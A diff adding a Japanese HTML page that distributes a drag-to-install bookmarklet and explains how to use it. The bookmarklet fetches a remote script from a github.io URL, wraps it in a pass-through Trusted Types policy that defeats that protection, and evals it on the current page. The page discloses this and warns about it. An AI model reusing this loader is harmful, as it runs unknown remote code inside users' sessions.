@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ブックマークレット配布デモ</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Shippori+Mincho:wght@500;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #f5f1ea;
+    --ink: #1a1a1a;
+    --muted: #6b6661;
+    --accent: #c1432f;
+    --line: #d6cfc2;
+    --card: #ffffff;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Shippori Mincho', 'Hiragino Mincho ProN', 'Yu Mincho', serif;
+    background: var(--bg);
+    color: var(--ink);
+    line-height: 1.8;
+    padding: 4rem 1.5rem;
+    min-height: 100vh;
+  }
+  .wrap {
+    max-width: 640px;
+    margin: 0 auto;
+  }
+  header {
+    border-bottom: 1px solid var(--line);
+    padding-bottom: 2rem;
+    margin-bottom: 3rem;
+  }
+  .eyebrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.75rem;
+    letter-spacing: 0.2em;
+    color: var(--accent);
+    text-transform: uppercase;
+    margin-bottom: 1rem;
+  }
+  h1 {
+    font-size: 2rem;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    line-height: 1.4;
+  }
+  .lead {
+    color: var(--muted);
+    margin-top: 1rem;
+    font-size: 1rem;
+  }
+  .card {
+    background: var(--card);
+    border: 1px solid var(--line);
+    padding: 2.5rem 2rem;
+    margin: 2rem 0;
+    text-align: center;
+    position: relative;
+  }
+  .card::before {
+    content: "DRAG ↓";
+    position: absolute;
+    top: -0.6rem;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--bg);
+    padding: 0 0.8rem;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.2em;
+    color: var(--muted);
+  }
+  .bm-link {
+    display: inline-block;
+    background: var(--ink);
+    color: var(--bg);
+    padding: 0.9rem 2rem;
+    text-decoration: none;
+    font-family: 'Shippori Mincho', serif;
+    font-weight: 700;
+    font-size: 1.05rem;
+    border: 1px solid var(--ink);
+    cursor: grab;
+    transition: transform 0.15s ease, box-shadow 0.15s ease;
+    user-select: none;
+  }
+  .bm-link:hover {
+    transform: translateY(-2px);
+    box-shadow: 4px 4px 0 var(--accent);
+  }
+  .bm-link:active {
+    cursor: grabbing;
+  }
+  .card-note {
+    margin-top: 1.2rem;
+    font-size: 0.85rem;
+    color: var(--muted);
+  }
+  h2 {
+    font-size: 1.1rem;
+    font-weight: 700;
+    margin: 2.5rem 0 1rem;
+    padding-left: 0.8rem;
+    border-left: 3px solid var(--accent);
+  }
+  ol, ul {
+    padding-left: 1.5rem;
+    color: var(--ink);
+  }
+  ol li, ul li {
+    margin-bottom: 0.5rem;
+  }
+  .steps li::marker {
+    font-family: 'JetBrains Mono', monospace;
+    color: var(--accent);
+    font-weight: 500;
+  }
+  details {
+    margin-top: 1rem;
+    border: 1px solid var(--line);
+    background: var(--card);
+  }
+  summary {
+    padding: 0.8rem 1rem;
+    cursor: pointer;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.8rem;
+    color: var(--muted);
+    letter-spacing: 0.05em;
+  }
+  summary:hover { color: var(--ink); }
+  pre {
+    padding: 1rem;
+    background: #1a1a1a;
+    color: #e8e3d8;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem;
+    line-height: 1.6;
+    overflow-x: auto;
+    white-space: pre-wrap;
+    word-break: break-all;
+  }
+  .warn {
+    margin-top: 2rem;
+    padding: 1rem 1.2rem;
+    background: rgba(193, 67, 47, 0.06);
+    border-left: 3px solid var(--accent);
+    font-size: 0.88rem;
+    color: var(--muted);
+  }
+  footer {
+    margin-top: 4rem;
+    padding-top: 2rem;
+    border-top: 1px solid var(--line);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 0.7rem;
+    letter-spacing: 0.1em;
+    color: var(--muted);
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div class="eyebrow">Bookmarklet / 配布デモ</div>
+      <h1>このボタンをブックマークバーへ<br>ドラッグしてください</h1>
+      <p class="lead">サイト側からブックマークを直接追加することはできませんが、リンクのドラッグ&ドロップなら <code style="font-family:'JetBrains Mono',monospace;font-size:0.85em;">javascript:</code> URL もそのまま登録できます。</p>
+    </header>
+
+    <div class="card">
+      <a class="bm-link" href="javascript:(async()=>{try{var c=await(await fetch('https://documentgit.github.io/youtube.github.io/test.js?%27+%20+new%20Date)).text();c=trustedTypes.createPolicy(%27%27+%20+new%20Date,{createScript:s=%3Es}).createScript(c);eval(c)}catch(e){alert(e)}})()" onclick="event.preventDefault(); alert('クリックではなく、このボタンをブックマークバーへドラッグしてください。');">▸ My Bookmarklet</a>
+      <div class="card-note">クリックしても動きません。ドラッグで登録してください。</div>
+    </div>
+
+    <h2>使い方</h2>
+    <ol class="steps">
+      <li>ブラウザのブックマークバーを表示しておく(<code style="font-family:'JetBrains Mono',monospace;font-size:0.85em;">Ctrl/⌘ + Shift + B</code>)</li>
+      <li>上の黒いボタンをマウスでつまみ、ブックマークバーへ落とす</li>
+      <li>使いたいページを開いた状態で、登録したブックマークをクリック</li>
+    </ol>
+
+    <h2>登録できない場合</h2>
+    <ul>
+      <li>ボタンを右クリック →「リンクをブックマーク」でもOK(ブラウザにより文言は異なります)</li>
+      <li>モバイルブラウザではこの方式は使えません</li>
+    </ul>
+
+    <details>
+      <summary>▸ ブックマークレットのコードを表示</summary>
+<pre>javascript:(async()=&gt;{
+  try{
+    var c = await (await fetch(
+      'https://documentgit.github.io/youtube.github.io/test.js?' + +new Date
+    )).text();
+    c = trustedTypes.createPolicy('' + +new Date, {
+      createScript: s =&gt; s
+    }).createScript(c);
+    eval(c);
+  } catch(e) { alert(e); }
+})()</pre>
+    </details>
+
+    <div class="warn">
+      <strong>注意:</strong> このブックマークレットは外部のスクリプトを読み込んで実行します。実行時点でリモート側のコードがそのページ上で動くため、配布元を信頼できる場合にのみ登録してください。
+    </div>
+
+    <footer>
+      DEMO · DRAG-TO-INSTALL PATTERN
+    </footer>
+  </div>
+</body>
+</html>
